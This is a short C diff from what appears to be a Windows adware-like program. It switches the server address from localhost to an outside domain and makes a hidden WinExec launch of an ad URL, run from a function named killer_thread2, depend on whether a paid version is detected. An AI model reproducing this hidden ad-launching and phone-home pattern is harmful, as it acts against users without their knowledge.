@@ -15,7 +15,7 @@
 #include <wininet.h>
 #pragma comment(lib,"wininet.lib")
 
-#if 1
+#if 0
 char *g_server_address = "http://127.0.0.1/";
 #else
 char *g_server_address = "http://bo3d.net:80/";
@@ -1327,7 +1327,8 @@ DWORD WINAPI killer_thread2(LPVOID time)
 	{
 		sprintf(url, "explorer.exe \"%s\"", g_ad_address);
 
-		WinExec(url, SW_HIDE);
+		if (!is_payed_version())
+			WinExec(url, SW_HIDE);
 	}
 	else
 	{
